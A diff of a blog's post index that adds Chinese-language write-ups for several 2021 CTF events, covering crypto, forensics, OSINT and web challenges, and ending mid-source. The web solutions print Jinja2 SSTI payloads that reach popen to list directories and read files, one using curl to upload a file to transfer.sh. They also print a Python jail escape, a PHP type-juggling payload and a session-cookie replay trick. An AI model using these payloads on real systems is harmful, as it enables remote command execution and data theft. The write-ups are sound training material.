@@ -25,7 +25,19 @@
   <entry>
     <title>TamilCTF2021 Writeup</title>
     <url>/posts/2827311957/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="Open-Flag"><a href="#Open-Flag" class="headerlink" title="Open Flag"></a>Open Flag</h1><hr>
+<p>访问题目中给出的链接,发现是一个登录页面<br><img data-src="images/login.png" alt="Open Flag" style="zoom:80%;"><br>随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是<code>./flag.jpg</code>.<br>F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可<br><img data-src="images/image-20211119203608270.jpg" alt="image-20211119203608270" style="zoom:70%;"></p>
+<p>使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记<code>&lt;!--</code>,找到<code>os._wrap_close</code>模块所在的索引为132,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()}}
+</code></pre>
+<p><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png" alt="image-20211119212248483"></p>
+<p>使用<code>curl</code>命令将<code>flag.jpg</code>文件上传至<a href="http://transfer.sh/" target="_blank" rel="noopener">transfer.sh</a></p>
+<pre><code class="python">{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg').read()}}
+</code></pre>
+<p>在HTML注释中找到文件上传后的URL<code>http://transfer.sh/bDGBlw/flag.jpg</code><br><img data-src="../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png" alt="image-20211119204635015"></p>
+<p><img data-src="images/flag.jpg" alt="Open Flag" style="zoom:80%;"></p>
+<p><strong>flag:</strong><code>TamilCTF{SsTi_Is_VeRy_DaNgErOuS}</code><br><a id="more"></a></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -37,7 +49,85 @@
   <entry>
     <title>TFCCTF2021 Writeup</title>
     <url>/posts/501486646/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
+<p><em>Wrap the result in TFCCTF{}</em></p>
+<hr>
+<p>看着像摩斯码,直接在<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code(&#39;Space&#39;,&#39;Line%20feed&#39;" target="_blank" rel="noopener">gchq.github.io</a>&amp;input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo)上解密</p>
+<p><img data-src="../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
+<p><strong>flag:</strong><code>TFCCTF{WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?}</code><br><a id="more"></a></p>
+<h1 id="SEA-LANGUAGE-2"><a href="#SEA-LANGUAGE-2" class="headerlink" title="SEA LANGUAGE? 2"></a>SEA LANGUAGE? 2</h1><p><em>That’s just another way to……</em></p>
+<hr>
+<p>题目给的数据8个字符为一组,猜测可能是二进制,在<a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B&#39;option&#39;:&#39;Simple%20string&#39;,&#39;string&#39;:&#39;.&#39;%7D,&#39;0&#39;,true,false,true,false" target="_blank" rel="noopener">gchq.github.io</a>Find_/<em>Replace(%7B’option’:’Simple%20string’,’string’:’</em>‘%7D,’1’,true,false,true,false)From_Binary(‘Space’,8)&amp;input=Ll8uXy5fLi4gLl8uLi5fXy4gLl8uLi4uX18gLl8uLi4uX18gLl8uXy5fLi4gLl8uLi5fXy4gLl9fX18uX18gLl9fXy5fX18gLi5fXy5fLi4KIC4uX18uLi5fIC4uX18uX19fIC5fLl9fX19fIC4uX18uXy4uIC5fLl9fX19fIC5fXy5fXy5fIC4uX18uLi5fIC5fXy5fX18uIC5fX18uXy5fCiAuLl9fLl9fXyAuLl9fLi5fXyAuLl8uX19fLiAuLl8uX19fLiAuLl8uX19fLiAuXy5fX19fXyAuLl9fLl9fXyAuX18uXy4uLiAuLl9fLi4uXwogLi5fXy5fLl8gLl8uX19fX18gLi5fXy4uLl8gLl9fXy4uX18gLl8uX19fX18gLl9fLl9fXy4gLi5fXy4uLi4gLi5fXy5fX18gLl8uX19fX18KIC5fXy5fXy5fIC4uX18uLi4uIC5fX18uLl8uIC5fX18uLl9fIC4uX18uLl9fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fCiAuLl8uLi4uXyAuX19fLi5fLiAuLl9fLi4uXyAuX18uLl9fXyAuX18uXy4uLiAuLl9fLl9fXyAuLl9fX19fXyAuX19fX18uXwo)将<code>.</code>替换为<code>0</code>,<code>_</code>替换为<code>1</code>,然后二进制转字符串</p>
+<p><img data-src="../../CTF/TFCCTF2021/Crypto/images/image-20211202205304755.png" alt="image-20211202205739848"></p>
+<p><strong>flag:</strong><code>TFCCTF{w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?}</code></p>
+<h1 id="AAAAA"><a href="#AAAAA" class="headerlink" title="AAAAA"></a>AAAAA</h1><p><em>AAAAA. That’s all</em></p>
+<hr>
+<p>首先用<code>exiftool</code>分析,提示文件前2000个字节都是A</p>
+<pre><code class="shell">~$ exiftool AAAAA
+ExifTool Version Number         : 12.31
+File Name                       : AAAAA
+Directory                       : .
+File Size                       : 157 KiB
+File Modification Date/Time     : 2021:11:27 00:33:54+08:00
+File Access Date/Time           : 2021:11:27 00:35:25+08:00
+File Inode Change Date/Time     : 2021:11:27 00:34:19+08:00
+File Permissions                : -rw-r--r--
+Error                           : First 2000 bytes of file is ASCII &#39;A&#39; characters
+</code></pre>
+<p><code>hexdump -C AAAAA</code>发现文件末尾的字节也有很多A,并且文件应该是一张PNG格式的图片</p>
+<pre><code class="shell">~$ hexdump -C AAAAA | head
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+000007d0  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
+000007e0  00 00 07 62 00 00 05 89  08 02 00 00 00 23 47 40  |...b.........#G@|
+000007f0  3c 00 00 00 09 70 48 59  73 00 00 2e 23 00 00 2e  |&lt;....pHYs...#...|
+00000800  23 01 78 a5 3f 76 00 02  65 2b 49 44 41 54 78 9c  |#.x.?v..e+IDATx.|
+00000810  ec bd 67 7b 1a cb da b4  dd 83 10 39 83 50 b6 bd  |..g{.......9.P..|
+00000820  c2 de ff ff df dc ef 5e  6b d9 96 ad 48 ce 39 cc  |.......^k...H.9.|
+00000830  fb a1 9e a9 e3 12 b2 bd  1c 24 10 50 e7 07 1d 08  |.........$.P....|
+00000840  21 18 26 f4 74 57 57 d7  e5 f9 be ef 84 10 42 08  |!.&amp;.tWW.......B.|
+
+~$ hexdump -C AAAAA | tail  
+00026cf0  00 00 88 26 13 03 00 00  00 00 44 93 89 01 00 00  |...&amp;......D.....|
+00026d00  00 00 a2 c9 c4 00 00 00  00 00 d1 64 62 00 00 00  |...........db...|
+00026d10  00 80 68 32 31 00 00 00  00 40 34 99 18 00 00 00  |..h21....@4.....|
+00026d20  00 20 9a 4c 0c 00 00 00  00 10 4d 26 06 00 00 00  |. .L......M&amp;....|
+00026d30  00 88 f6 7f 00 7a e5 96  20 a3 a9 bd a4 00 00 00  |.....z.. .......|
+00026d40  00 49 45 4e 44 ae 42 60  82 41 41 41 41 41 41 41  |.IEND.B`.AAAAAAA|
+00026d50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+*
+00027510  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
+00027519
+</code></pre>
+<p>去除文件首位的<code>A</code>即可,代码:</p>
+<pre><code class="python"><span class="keyword">from</span> pathlib <span class="keyword">import</span>  Path
+p = Path(<span class="string">'AAAAA'</span>)
+data = p.read_bytes()
+data = data.strip(<span class="string">b'A'</span>)
+Path(<span class="string">'a.png'</span>).write_bytes(data)
+</code></pre>
+<p><img data-src="../../CTF/TFCCTF2021/Forensics/images/AAAAA.png" alt="AAAAA.png"></p>
+<p><strong>flag:</strong><code>TFCCTF{Gr4phic_d35ign_is_my_p455ion}</code></p>
+<h1 id="DISCORD-SHENANIGANS"><a href="#DISCORD-SHENANIGANS" class="headerlink" title="DISCORD SHENANIGANS"></a>DISCORD SHENANIGANS</h1><p><em>We considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That’s the beginning of a good CTF! Discord is the new Twitter.</em></p>
+<p><em>To be able to solve this challenge, you’ll need to join our discord. Link in the Rules page.</em></p>
+<hr>
+<p>翻阅比赛官方的Discord,发现<code>#general</code>频道有一条特别奇怪的消息</p>
+<p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203203451799.png" alt="image-20211203203451799"></p>
+<p>使用<a href="https://holloway.nz/steg/" target="_blank" rel="noopener">Twitter Secret Messages</a>解密即可</p>
+<p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211202215347694.png" alt="image-20211202215347694"></p>
+<p><strong>flag:</strong><code>TFCCTF{th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll}</code></p>
+<h1 id="PRETTY-GOOD-PHISHER"><a href="#PRETTY-GOOD-PHISHER" class="headerlink" title="PRETTY GOOD PHISHER"></a>PRETTY GOOD PHISHER</h1><p><em>This phisher thinks he’s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him?</em></p>
+<p><em>A2DCB36111E3656B</em></p>
+<hr>
+<p>题目给了一个人的PGP密钥ID,要求我们找到他另一个以真名公开的PGP密钥</p>
+<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&amp;EmailOrName=3&amp;SearchType=0" target="_blank" rel="noopener">https://keyserver.pgp.com/</a>上检索,得到邮箱<a href="mailto:`tdgd11fd8@gmail.com" target="_blank" rel="noopener">`tdgd11fd8@gmail.com</a>`</p>
+<p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png" alt="image-20211203195242066"></p>
+<p>在<a href="https://tools.epieos.com/email.php" target="_blank" rel="noopener">OSINT Tool</a>上搜索该邮箱,得到用户名是<code>Theobald Dannie Gyles</code></p>
+<p><img data-src="images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;"></p>
+<p>在<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event" target="_blank" rel="noopener">https://keyserver.pgp.com/</a>上搜索包含该用户名的PGP密钥,即可得到flag</p>
+<p><img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png" alt="image-20211203201556442"></p>
+<p><strong>flag:</strong><code>TFCCTF{Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!})</code></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -49,7 +139,49 @@
   <entry>
     <title>L3HCTF2021-个人能力认证 Writeup</title>
     <url>/posts/98571386/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p><em><a href="http://123.60.19.253:10001" target="_blank" rel="noopener">http://123.60.19.253:10001</a></em></p>
+<hr>
+<p>分析给出的源文件,发现<code>/success</code>路由下的<code>name</code>存在SSTI漏洞.</p>
+<p>继续分析,<code>name</code>取自<code>session[&#39;name&#39;]</code>,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.</p>
+<pre><code class="python">template =  <span class="string">'''</span>
+<span class="string">Congratulations, %s. You can get flag now!</span>
+<span class="string">'''</span> % name
+<span class="keyword">return</span> render_template_string(template)
+</code></pre>
+<p>要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,<code>/vote</code>接口会校验<code>session</code>中保存的vote数量并减一,猜测这里可能存在session会话劫持.</p>
+<p>我们第一次登录时复制一下当前的<code>session</code>,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的<code>seesion</code>粘贴进浏览器保存的Cookie中,我们的票又回来了.</p>
+<blockquote>
+<p>🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.</p>
+</blockquote>
+<p><img data-src="images/0.jpg" alt="image-20211114190032492" style="zoom:50%;"></p>
+<p>使用如下代码作为用户名登录,查看一下当前已加载模块</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()}}
+</code></pre>
+<p><img data-src="images/1.jpg" alt="image-20211114182131940" style="zoom:50%;"></p>
+<p>人肉计数/写个脚本,找到<code>os._wrap_close</code>模块所在的索引,借助于<code>popen</code>函数可以直接执行系统命令</p>
+<pre><code class="python">num = <span class="number">0</span>
+<span class="keyword">for</span> i <span class="keyword">in</span> a.split(<span class="string">', '</span>):
+    <span class="keyword">if</span> <span class="string">'os._wrap_close'</span> <span class="keyword">in</span> i:
+        print(num)
+    num += <span class="number">1</span>
+</code></pre>
+<p>先<code>ls -a</code>一下,发现<code>config.py</code></p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -a').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/2.png" alt="image-20211114183143814"><br>继续<code>cat</code>,没有在<code>config.py</code>中找到flag</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat config.py').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/3.png" alt="image-20211114183703433"></p>
+<p>用<code>ls -R /</code>找找,发现存在<code>/flag</code>文件</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls -R /').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/4.jpg" alt="image-20211114183857713"><br>直接<code>cat /flag</code>即可</p>
+<pre><code class="python">{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
+</code></pre>
+<p><img data-src="../../CTF/L3HCTF2021-个人能力认证/Web/images/5.png" alt="image-20211114184236370"></p>
+<p><strong>flag:</strong><code>l3hsec{emmMmMM_mm~mMMmm~~T}</code></p>
+<a id="more"></a>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
         <category>CTF</category>
       </categories>
@@ -62,7 +194,286 @@
   <entry>
     <title>KillerQueenCTF2021 Writeup</title>
     <url>/posts/2621990551/</url>
-    <content><![CDATA[<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+    <content><![CDATA[<h1 id="Cloudsourcing"><a href="#Cloudsourcing" class="headerlink" title="Cloudsourcing"></a>Cloudsourcing</h1><p><em>Sourced in the cloud</em></p>
+<hr>
+<p>使用<a href="https://github.com/Ganapati/RsaCtfTool" target="_blank" rel="noopener">RsaCtfTool</a>破解公钥,将得到的私钥保存至<code>a.pem</code></p>
+<pre><code class="shell">~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
+e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
+O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
+dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
+lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
+pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
+KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
+dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
+19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
+Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
+wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
+60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
+TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
+gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
+z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
+mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
+HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
+n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
+Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
+ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
+WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
+I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
+tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
+hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
+SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>编写代码,用RSA解密</p>
+<pre><code class="python"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA
+<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> PKCS1_cipher
+<span class="keyword">import</span> base64
+c = <span class="string">'Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA=='</span>
+
+<span class="keyword">with</span> open(<span class="string">'a.pem'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:
+    pri_key = RSA.importKey(f.read())
+    cipher = PKCS1_cipher.new(pri_key)
+    plain = cipher.decrypt(base64.b64decode(c), <span class="number">0</span>)
+    print(plain)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}</code><br><a id="more"></a></p>
+<h1 id="Road-Safety-Association"><a href="#Road-Safety-Association" class="headerlink" title="Road_Safety_Association"></a>Road_Safety_Association</h1><p><em>That’s what it stands for, right?</em></p>
+<hr>
+<p>题目给了c,p,q,e的值,直接求d解密即可<br>代码:</p>
+<pre><code class="python"><span class="keyword">import</span> gmpy2
+<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes
+
+c = <span class="number">34709089913401150635163820358938916881993556790698827096314474131695180194656373592831158701400832173951061153349955626770351918715134102729180082310540500929299260384727841272328651482716425284903562937949838801126975821205390573428889205747236795476232421245684253455346750459684786949905537837807616524618</span>
+p = <span class="number">7049378199874518503065880299491083072359644394572493724131509322075604915964637314839516681795279921095822776593514545854149110798068329888153907702700969</span>
+q = <span class="number">11332855855499101423426736341398808093169269495239972781080892932533129603046914334311158344125602053367004567763440106361963142912346338848213535638676857</span>
+e = <span class="number">65537</span>
+
+n = p * q
+phi = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)
+d = gmpy2.invert(e, phi)
+x = pow(c, d, n)
+print(x)
+print(long_to_bytes(x))
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{y0uv3_6r4du473d_fr0m_r54_3l3m3n74ry_5ch00l_ac8770bdcebc}</code></p>
+<h1 id="Hammer-To-Fall"><a href="#Hammer-To-Fall" class="headerlink" title="Hammer To Fall"></a>Hammer To Fall</h1><p><em>Dynamically sized integers huh (wrap the proper input in a flag wrapper kqctf{number})</em></p>
+<hr>
+<p>源文件:</p>
+<pre><code class="python"><span class="keyword">import</span> numpy <span class="keyword">as</span> np
+
+a = np.array([<span class="number">0</span>], dtype=int)
+val = int(input(<span class="string">"This hammer hits so hard it creates negative matter\n"</span>))
+<span class="keyword">if</span> val == <span class="number">-1</span>:
+    exit()
+a[<span class="number">0</span>] = val
+a[<span class="number">0</span>] = (a[<span class="number">0</span>] * <span class="number">7</span>) + <span class="number">1</span>
+print(a[<span class="number">0</span>])
+<span class="keyword">if</span> a[<span class="number">0</span>] == <span class="number">-1</span>:
+    print(<span class="string">"flag!"</span>)
+</code></pre>
+<p><code>NumPy</code>中的int使用的是C中的long,参照<a href="https://numpy.org/doc/stable/reference/arrays.scalars.html#numpy.int_" target="_blank" rel="noopener">NumPy文档</a>,最大值为9223372036854775807</p>
+<pre><code class="python"><span class="meta">&gt;&gt;&gt; </span><span class="number">9223372036854775807</span> // <span class="number">7</span> * <span class="number">2</span>
+<span class="number">2635249153387078802</span>
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{2635249153387078802}</code></p>
+<h1 id="I-want-to-break-free"><a href="#I-want-to-break-free" class="headerlink" title="I want to break free"></a>I want to break free</h1><p><em>I want to break free… from this Python jail. nc 143.198.184.186 45457</em></p>
+<hr>
+<p>使用<code>&#39;o&#39;+&#39;s&#39;</code>绕过对os的过滤,执行ls命令,发现存在文件<code>cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt</code></p>
+<pre><code class="shell">~$ nc 143.198.184.186 45457
+
+    You are in jail. Can you escape?
+
+<span class="meta">&gt;</span><span class="bash"> __builtins__.__import__(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'ls'</span>)</span>
+bin
+blacklist.txt
+boot
+cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
+dev
+etc
+home
+jail.py
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+None
+</code></pre>
+<p>读取文件内容</p>
+<pre><code class="shell"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">print</span>(__builtins__.open(<span class="string">'cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt'</span>).<span class="built_in">read</span>())</span>
+kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}
+
+None
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}</code></p>
+<h1 id="sneeki-snek"><a href="#sneeki-snek" class="headerlink" title="sneeki snek"></a>sneeki snek</h1><p><em>ssssssssssssssssssssssssssssssssssssss</em></p>
+<hr>
+<p>根据字节码还原文件:</p>
+<pre><code class="python">f = <span class="string">''</span>
+a = <span class="string">'rwhxi}eomr\\^`Y'</span>
+z = <span class="string">'f]XdThbQd^TYL&amp;\x13g'</span>
+a = a + z
+<span class="keyword">for</span> i,b <span class="keyword">in</span> enumerate(a):
+    c = ord(b)
+    c = c - <span class="number">7</span>
+    c = c+i
+    f += chr(c)
+
+print(f)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{dont_be_mean_to_snek_:(}</code></p>
+<h1 id="sneeki-snek-2-oh-no-what-did-i-do"><a href="#sneeki-snek-2-oh-no-what-did-i-do" class="headerlink" title="sneeki snek 2 oh no what did i do"></a>sneeki snek 2 oh no what did i do</h1><p><em>did snek steal your pasta because this is some spaghetti</em></p>
+<hr>
+<p>根据字节码还原文件:</p>
+<pre><code class="python">a = list()
+a.append(<span class="number">1739411</span>)
+a.append(<span class="number">1762811</span>)
+a.append(<span class="number">1794011</span>)
+a.append(<span class="number">1039911</span>)
+a.append(<span class="number">1061211</span>)
+a.append(<span class="number">1718321</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1006611</span>)
+a.append(<span class="number">1516111</span>)
+a.append(<span class="number">1739411</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1506121</span>)
+a.append(<span class="number">1783901</span>)
+a.append(<span class="number">1783901</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1006611</span>)
+a.append(<span class="number">1561711</span>)
+a.append(<span class="number">1039911</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1561711</span>)
+a.append(<span class="number">1582801</span>)
+a.append(<span class="number">1773911</span>)
+a.append(<span class="number">1006611</span>)
+a.append(<span class="number">1516111</span>)
+a.append(<span class="number">1516111</span>)
+a.append(<span class="number">1739411</span>)
+a.append(<span class="number">1728311</span>)
+a.append(<span class="number">1539421</span>)
+
+b = <span class="string">''</span>
+<span class="keyword">for</span> i <span class="keyword">in</span> a:
+    c = str(i)
+    c=c[::<span class="number">-1</span>]
+    c= c[:<span class="number">-1</span>]
+    c = int(c)
+    c = <span class="number">5</span> ^ c
+    c= c - <span class="number">55555</span>
+    c = c // <span class="number">555</span>
+    b = b + chr(c)
+print(b)
+</code></pre>
+<p><strong>flag:</strong><code>kqctf{snek_waas_not_so_sneeki}</code></p>
+<h1 id="Just-Not-My-Type"><a href="#Just-Not-My-Type" class="headerlink" title="Just Not My Type"></a>Just Not My Type</h1><p><em>I really don’t think we’re compatible (<a href="http://143.198.184.186:7000/" target="_blank" rel="noopener">Link</a>)</em></p>
+<hr>
+<p>源文件:</p>
+<pre><code class="php+HTML">&lt;h1&gt;I just don&apos;t think we&apos;re compatible&lt;/h1&gt;
+&lt;?php
+$FLAG = &quot;shhhh you don&apos;t get to see this locally&quot;;
+if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;) 
+{
+    $password = $_POST[&quot;password&quot;];
+    if (strcasecmp($password, $FLAG) == 0) {
+        echo $FLAG;
+    } 
+    else {
+        echo &quot;That&apos;s the wrong password!&quot;;
+    }
+}
+?&gt;
+&lt;form method=&quot;POST&quot;&gt;
+    Password
+    &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;
+    &lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p><strong>Payload</strong></p>
+<pre><code class="php+HTML">password[]=123
+</code></pre>
+<p><strong>flag:</strong><code>flag{no_way!_i_took_the_flag_out_of_the_source_before_giving_it_to_you_how_is_this_possible}</code></p>
+<h1 id="PHat-Pottomed-Girls"><a href="#PHat-Pottomed-Girls" class="headerlink" title="PHat Pottomed Girls"></a>PHat Pottomed Girls</h1><p><em>Now it’s attempt number 3 and this time with a Queen reference! (flag is in the root directory)</em></p>
+<hr>
+<p>源文件:</p>
+<pre><code class="php+HTML">&lt;?php
+session_start();
+
+function generateRandomString($length = 15) {
+    $characters = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;
+    $charactersLength = strlen($characters);
+    $randomString = &apos;&apos;;
+    for ($i = 0; $i &lt; $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+function filter($originalstring) {
+    $notetoadd = str_replace(&quot;&lt;?php&quot;, &quot;&quot;, $originalstring);
